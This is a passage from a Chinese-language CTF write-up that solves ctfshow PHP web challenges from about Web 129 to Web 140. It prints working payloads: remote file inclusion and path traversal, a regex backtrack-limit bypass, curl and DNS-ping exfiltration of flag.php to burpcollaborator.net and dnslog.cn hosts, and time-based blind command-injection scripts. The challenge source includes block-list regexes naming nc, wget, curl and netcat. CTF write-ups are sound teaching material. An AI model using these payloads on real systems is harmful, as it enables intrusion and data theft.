class="keyword">if</span>(stripos(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;0)&#123;        <span class="built_in">echo</span> readfile(<span class="variable">$f</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stripos() <span class="comment"># 查找字符串在另一字符串中第一次出现的位置（不区分大小写）,从0开始</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解一# 远程文件包含 在自己的服务器上写上一句话 test.txt?f=http://url/test.txt?ctfshow</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解二# filter 伪协议?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解三# 目录穿越?f=/ctfshow/../../../../../var/www/html/flag.php</span></span><br></pre></td></tr></table></figure><h2 id="1-31-Web-130-—-正则最大回溯次数绕过"><a href="#1-31-Web-130-—-正则最大回溯次数绕过" class="headerlink" title="1.31 Web 130 — 正则最大回溯次数绕过"></a>1.31 Web 130 — 正则最大回溯次数绕过</h2><p><a href="https://www.jb51.net/article/49631.htm">https://www.jb51.net/article/49631.htm</a></p><p><img src="https://i.loli.net/2021/08/02/w3FPDeNUHBTigRu.png" alt="image-20210802120920025"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">very very very（省略25万个very）ctfshow</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;        die(<span class="string">&#x27;bye!&#x27;</span>);    &#125;    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === FALSE)&#123;        die(<span class="string">&#x27;bye!!&#x27;</span>);    &#125;    <span class="built_in">echo</span> <span class="variable">$flag</span>;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>考察点：<strong>利用正则最大回溯次数绕过</strong></p><p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过第一个正则表达式了</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import requestsurl=<span class="string">&quot;http://039253c3-1444-428e-9301-1eadc5f79ab4.challenge.ctf.show:8080/&quot;</span>data=&#123;<span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*250000+<span class="string">&#x27;ctfshow&#x27;</span>&#125;r=requests.post(url,data=data)<span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/02/xq3CMlAumonI9ZU.png" alt="image-20210802115252780"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 非预期解f=ctfshowf[]=ctfshow</span></span><br></pre></td></tr></table></figure><h2 id="1-32-Web-131-—-正则最大回溯次数绕过"><a href="#1-32-Web-131-—-正则最大回溯次数绕过" class="headerlink" title="1.32 Web 131 — 正则最大回溯次数绕过"></a>1.32 Web 131 — 正则最大回溯次数绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;    <span class="variable">$f</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;        die(<span class="string">&#x27;bye!&#x27;</span>);    &#125;    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>,<span class="string">&#x27;36Dctfshow&#x27;</span>) === FALSE)&#123;        die(<span class="string">&#x27;bye!!&#x27;</span>);    &#125;    <span class="built_in">echo</span> <span class="variable">$flag</span>;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import requestsurl=<span class="string">&quot;http://4a5d7bd2-7fc7-4a6f-90bd-8eef9693bf0a.challenge.ctf.show:8080/&quot;</span>data=&#123;    <span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*250000+<span class="string">&#x27;36Dctfshow&#x27;</span>&#125;r=requests.post(url,data=data)<span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h2 id="1-33-Web-132-—-false-amp-amp-false-username-”admin”"><a href="#1-33-Web-132-—-false-amp-amp-false-username-”admin”" class="headerlink" title="1.33 Web 132 — false &amp;&amp; false || $username ===”admin”"></a>1.33 Web 132 — false &amp;&amp; false || $username ===”admin”</h2><p>一个 Web 页面</p><p>扫描后台</p><p><img src="https://i.loli.net/2021/08/02/4sFSywvTBbjpfLm.png" alt="image-20210802121650250"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="comment">#error_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;code&#x27;]))&#123;    $username = (String)$_GET[&#x27;username&#x27;];    $password = (String)$_GET[&#x27;password&#x27;];    $code = (String)$_GET[&#x27;code&#x27;];        if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)&#123;                if($code == &#x27;admin&#x27;)&#123;            echo $flag;        &#125;            &#125;&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?username=admin&amp;password=1&amp;code=admin</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/02/RX2Dwak1VZC8neG.png" alt="image-20210802121426804"></p><p><img src="https://i.loli.net/2021/08/02/wKxFbDq7QmNTdVX.png" alt="image-20210802121451767"></p><h2 id="1-34-Web-133-—-无回显命令执行"><a href="#1-34-Web-133-—-无回显命令执行" class="headerlink" title="1.34 Web 133 — 无回显命令执行"></a>1.34 Web 133 — 无回显命令执行</h2><p><a href="https://blog.csdn.net/qq_46091464/article/details/109095382">https://blog.csdn.net/qq_46091464/article/details/109095382</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);//flag.phpif(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;        <span class="built_in">eval</span>(substr(<span class="variable">$F</span>,0,6));    &#125;<span class="keyword">else</span>&#123;        die(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure><p>分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果传入 ?F=` <span class="variable">$F</span>`;sleep 5则 substr(<span class="variable">$F</span>,0,6) 后得到 ` <span class="variable">$F</span>`;即执行 <span class="built_in">eval</span>(` <span class="variable">$F</span>`;);也就是 <span class="built_in">eval</span>(` ` <span class="variable">$F</span>`;sleep 5`;);而 `` 与 shell_exec() 一致则 <span class="built_in">eval</span>(shell_exec(<span class="string">&quot; ` <span class="variable">$F</span>`;sleep 5&quot;</span>));测试后 真的 执行了 sleep 5</span><br></pre></td></tr></table></figure><p>题目转换成：<strong>无回显的命令执行</strong></p><ul><li><p><strong>法一</strong></p><p><img src="https://i.loli.net/2021/08/02/qmGe4jI7o8gZtbd.png" alt="image-20210802123812745"></p><p><img src="https://i.loli.net/2021/08/02/oTXGpwmtyYqZ3rQ.png" alt="image-20210802123843178"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F=`<span class="variable">$F</span>`;curl -X POST -F xx=@flag.php http://66ahgg5hlpg29qz2ehu6mn5hh8n1bq.burpcollaborator.net?F=`<span class="variable">$F</span>`;+curl -X POST -d<span class="string">&quot;flag=`cat flag.php`&quot;</span> ewe2mcnzf0hwu1l4eepxt26nwe25qu.burpcollaborator.net</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://i.loli.net/2021/10/01/kigqxcs5PmtvYQa.png" alt="image-20210810150448303"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload?F=`$F `;ping `ls | grep flag`.zdvlix.dnslog.cn -c 1?F=`$F `;ping `cat flag.php | grep flag`.zdvlix.dnslog.cn -c 1</span></span><br></pre></td></tr></table></figure><h2 id="1-35-Web-134-—-POST-数组覆盖"><a href="#1-35-Web-134-—-POST-数组覆盖" class="headerlink" title="1.35 Web 134 — _POST 数组覆盖"></a>1.35 Web 134 — _POST 数组覆盖</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);<span class="variable">$key1</span> = 0;<span class="variable">$key2</span> = 0;<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || isset(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || isset(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || isset(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;    die(<span class="string">&quot;nonononono&quot;</span>);&#125;@parse_str(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);extract(<span class="variable">$_POST</span>);<span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;    die(file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>));&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试&lt;?phpparse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);var_dump($_POST);# 传参 ?_POST[a]=123</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/08/amteA8lZkHP7svn.png" alt="image-20210808121554476"></p><p><img src="https://i.loli.net/2021/08/02/HYKx5rCNQElveW3.png" alt="image-20210802133330796"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?_POST[key1]=36d&amp;_POST[key2]=36d</span></span><br></pre></td></tr></table></figure><h2 id="1-36-Web-135-—-无回显命令执行-—-写文件-cp-nl"><a href="#1-36-Web-135-—-无回显命令执行-—-写文件-cp-nl" class="headerlink" title="1.36 Web 135 — 无回显命令执行 — 写文件 cp   nl"></a>1.36 Web 135 — 无回显命令执行 — 写文件 cp   nl</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web133plus</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);//flag.phpif(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;        <span class="built_in">eval</span>(substr(<span class="variable">$F</span>,0,6));    &#125;<span class="keyword">else</span>&#123;        die(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?F=`$F`; cp flag.php 1.txt# 然后访问 1.txt 即可?F=`$F `;nl f*&gt;2.txt</span></span><br></pre></td></tr></table></figure><h2 id="1-37-Web-136-—-无回显命令执行-—-ls-tee-xxx"><a href="#1-37-Web-136-—-无回显命令执行-—-ls-tee-xxx" class="headerlink" title="1.37 Web 136 — 无回显命令执行 — ls|tee xxx"></a>1.37 Web 136 — 无回显命令执行 — ls|tee xxx</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);<span class="keyword">function</span> check(<span class="variable">$x</span>)&#123;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;        die(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);    &#125;&#125;<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    check(<span class="variable">$c</span>);    <span class="built_in">exec</span>(<span class="variable">$c</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/02/Z7J62hxmCTvAteF.png" alt="image-20210802141126957"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls|tee xxx</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tee 命令  https://linux.cn/article-9435-1.htmlping www.baidu.com | tee 1.txt将正在执行命令的输出内容 写入 指定文件当中# 追加写入ping www.baidu.com | tee -a 1.txt# 写入多个文件当中ping www.baidu.com | tee 1.txt 2.txt 3.txtls | tee  2.txt 3.txt 4.txt # 让 tee 命令的输出内容直接作为另一个命令的输入内容 root@kali:/var/www/html/learn# ls *.txt | tee 5.txt | wc -l4</span></span><br></pre></td></tr></table></figure><p>参考  <a href="https://linux.cn/article-9435-1.html">https://linux.cn/article-9435-1.html</a></p><p><img src="https://i.loli.net/2021/08/02/KYJ9kCDABHOGc6i.png" alt="image-20210802141608591"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls|tee xxx<span class="comment"># 后访问 /xxx 将文件下载下来 得到当前目录之下 仅仅有 index.php</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/01/2pMsh8HFcSCoezb.png" alt="image-20210802142340473"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls /|tee 111</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/02/pdDAr1YcaRwMWsI.png" alt="image-20210802142541986"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=cat /f149_15_h3r3|tee 222</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/02/l87FYHj2x4WBC13.png" alt="image-20210802142703282"></p><h2 id="1-38-Web-137-—-call-user-func-传递-字符串-—-类名-函数名"><a href="#1-38-Web-137-—-call-user-func-传递-字符串-—-类名-函数名" class="headerlink" title="1.38 Web 137 — call_user_func() 传递 字符串 — 类名::函数名"></a>1.38 Web 137 — call_user_func() 传递 字符串 — 类名::函数名</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow&#123;    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;        die(<span class="string">&quot;private class&quot;</span>);    &#125;    static <span class="keyword">function</span> <span class="function"><span class="title">getFlag</span></span>()&#123;        <span class="built_in">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);    &#125;&#125;call_user_func(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payloadctfshow=ctfshow::getFlagctfshow=ctfshow-&gt;getFlag#不可行</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>php中 -&gt;与:: 调用类中的成员的区别</strong><br><strong>-&gt;    用于动态语境处理某个类的某个实例</strong><br><strong>::    可以调用一个静态的、不依赖于其他初始化的类方法.</strong></p><p>也就是说双冒号可以不用实例化类就可以直接调用类中的方法</p></blockquote><h2 id="1-39-Web-138-—-call-user-func-传递-数组-—-不使用"><a href="#1-39-Web-138-—-call-user-func-传递-数组-—-不使用" class="headerlink" title="1.39 Web 138 — call_user_func() 传递 数组 — 不使用 ::"></a>1.39 Web 138 — call_user_func() 传递 数组 — 不使用 ::</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow&#123;    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;        die(<span class="string">&quot;private class&quot;</span>);    &#125;    static <span class="keyword">function</span> <span class="function"><span class="title">getFlag</span></span>()&#123;        <span class="built_in">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);    &#125;&#125;<span class="keyword">if</span>(strripos(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;-1)&#123;    die(<span class="string">&quot;private function&quot;</span>);&#125;call_user_func(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/02/G7B1UmwbYlqMVar.png" alt="image-20210802143748059"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 函数传参&lt;?phpfunction barber($type)&#123;    echo &quot;You wanted a $type haircut, no problem\n&quot;;&#125;call_user_func(&#x27;barber&#x27;, &quot;mushroom&quot;);call_user_func(&#x27;barber&#x27;, &quot;shave&quot;);?&gt; //You wanted a mushroom haircut, no problem//You wanted a shave haircut, no problem# 类传方法&lt;?phpclass myclass &#123;    static function say_hello()    &#123;        echo &quot;Hello!\n&quot;;    &#125;&#125;$classname = &quot;myclass&quot;;call_user_func(array($classname, &#x27;say_hello&#x27;));call_user_func($classname .&#x27;::say_hello&#x27;); // As of 5.2.3$myobject = new myclass();call_user_func(array($myobject, &#x27;say_hello&#x27;));?&gt; </span></span><br></pre></td></tr></table></figure><h2 id="1-40-Web-139-—-无回显命令注入-—-awk、cut-盲注"><a href="#1-40-Web-139-—-无回显命令注入-—-awk、cut-盲注" class="headerlink" title="1.40 Web 139 — 无回显命令注入 — awk、cut 盲注"></a>1.40 Web 139 — 无回显命令注入 — awk、cut 盲注</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);<span class="keyword">function</span> check(<span class="variable">$x</span>)&#123;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;        die(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);    &#125;&#125;<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    check(<span class="variable">$c</span>);    <span class="built_in">exec</span>(<span class="variable">$c</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;?&gt;</span><br></pre></td></tr></table></figure><p><strong>awk  cut  盲注 命令：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面/111<span class="comment"># vi flag.phproot@kali:~/桌面/111# cat flag.php test1test2test3flag&#123;qwertyui&#125;root@kali:~/桌面/111# cat flag.php | awk NR==1test1root@kali:~/桌面/111# cat flag.php | awk NR==2test2root@kali:~/桌面/111# cat flag.php | awk NR==3test3root@kali:~/桌面/111# cat flag.php | awk NR==4flag&#123;qwertyui&#125;root@kali:~/桌面/111# cat flag.php | awk nr==4root@kali:~/桌面/111# cat flag.php | awk NR==4 | cut -c 1froot@kali:~/桌面/111# cat flag.php | awk NR==4 | cut -c 2lroot@kali:~/桌面/111# cat flag.php | awk NR==4 | cut -c 3aroot@kali:~/桌面/111# cat flag.php | awk NR==4 | cut -c 4groot@kali:~/桌面/111# if [ $(cat flag.php|awk NR==1|cut -c 2)==l ];then echo success;fi                                                             success                                                                   root@kali:~/桌面/111# if [ $(cat flag.php|awk NR==1|cut -c 2)==l ];then sleep 2;fi</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/05/iMTXdeNtrVFQKcW.png" alt="image-20210805153710357"></p><p><strong>脚本：查找根目录的内容</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import requestsimport timeimport string<span class="comment">#str=string.ascii_letters+string.digitsstr = &#x27;abcdefghigklmnopqrstuvwxyz_&#123;&#125;0123456789 &#x27;result=&quot;&quot;for i in range(1,10):key=0for j in range(1,50):if key==1:break#for n in range(32,128):for n in str:#n=chr(n)#payload=&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)payload=&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)#print(payload)url=&quot;http://4b941830-8b3f-49bd-8aa8-0d35e2d2d486.challenge.ctf.show:8080?c=&quot;+payloadtry:requests.get(url,timeout=(2.5,2.5))except:    result=result+n    print(result)    breakif n==&#x27;9&#x27;:key=1result+=&quot; &quot;</span></span><br></pre></td></tr></table></figure><p><strong>脚本：查 flag</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import requestsimport timeimport string<span class="comment">#str=string.ascii_letters+string.digitsstr = &#x27;abcdefghigklmnopqrstuvwxyz_&#123;&#125;0123456789 &#x27;result=&quot;&quot;for i in range(1,10):key=0for j in range(1,50):if key==1:break#for n in range(32,128):for n in str:#n=chr(n)payload=&quot;if [ `cat /f149_15_h3r3|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)#payload=&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)#print(payload)url=&quot;http://4b941830-8b3f-49bd-8aa8-0d35e2d2d486.challenge.ctf.show:8080?c=&quot;+payloadtry:requests.get(url,timeout=(2.5,2.5))except:    result=result+n    print(result)    breakif n==&#x27;9&#x27;:key=1result+=&quot; &quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import requestscmd = <span class="string">&#x27;cat /f149_15_h3r3&#x27;</span>result = <span class="string">&#x27;&#x27;</span><span class="keyword">for</span> i <span class="keyword">in</span> range(1, 10):    <span class="keyword">for</span> j <span class="keyword">in</span> range(1, 50):        <span class="built_in">print</span>(<span class="string">&#x27;i=&#x27;</span>, i, <span class="string">&#x27; j=&#x27;</span>, j)        <span class="keyword">for</span> k <span class="keyword">in</span> range(32, 128):            k = chr(k)            payload = f<span class="string">&quot;if [ `&#123;cmd&#125; |awk NR==&#123;i&#125;|cut -c &#123;j&#125;` == &#123;k&#125; ]; then sleep 3;fi&quot;</span>            payload = <span class="string">&#x27;?c=&#x27;</span> + payload            url = <span class="string">&#x27;http://4b941830-8b3f-49bd-8aa8-0d35e2d2d486.challenge.ctf.show:8080&#x27;</span>            try:                requests.get(url + payload, timeout=(2.5, 2.5))            except:                result = result + k                <span class="built_in">print</span>(result)                <span class="built_in">break</span>    result = result + <span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure><h2 id="1-41-Web-140-—-intval-code-‘ctfshow’-—-code-eval-“return-f1-f2-”"><a href="#1-41-Web-140-—-intval-code-‘ctfshow’-—-code-eval-“return-f1-f2-”" class="headerlink" title="1.41 Web 140 — intval($code) == ‘ctfshow’ — $code = eval(“return $f1($f2());”);"></a>1.41 Web 140 — intval($code) == ‘ctfshow’ — $code = eval(“return $f1($f2());”);</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;    <span class="variable">$f1</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];    <span class="variable">$f2</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;            <span class="variable">$code</span> = <span class="built_in">eval</span>(<span class="string">&quot;return <span class="variable">$f1</span>(<span class="variable">$f2</span>());&quot;</span>);            <span class="keyword">if</span>(intval(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;                <span class="built_in">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);            &#125;        &#125;    &#125;&#125;</span><br></pre></td></tr></table></figure><p>我们的目的是 ，而且只能使用 字母和数字进行构造</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="built_in">eval</span>(<span class="string">&quot;return <span class="variable">$f1</span>(<span class="variable">$f2</span>());&quot;</span>);<span class="keyword">if</span>(intval(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;      <span class="built_in">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);&#125;<span class="comment"># intval() == 弱类型比较，只要让 # $code 为 0 | False | NULL  即可 # 准确的来说，只要不是数字即可</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payloadmd5(phpinfo())#c4ca4238a0b923820dcc509a6f75849b#1md5(sleep())#d41d8cd98f00b204e9800998ecf8427e#空密码md5(md5())#d41d8cd98f00b204e9800998ecf8427e#空密码current(localeconv)sha1(getcwd())#md5(getcwd()) 不可行 #247369500707596003b38cd5879122f6f1=intval&amp;f2=intval# 0f1=usleep&amp;f2=usleep</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/05/3nXbdCi6fSDqg1p.png" alt="image-20210805161637530"></p><h2 id="1-42-Web-141-—-eval-“return-v1-v3-v2-”"><a 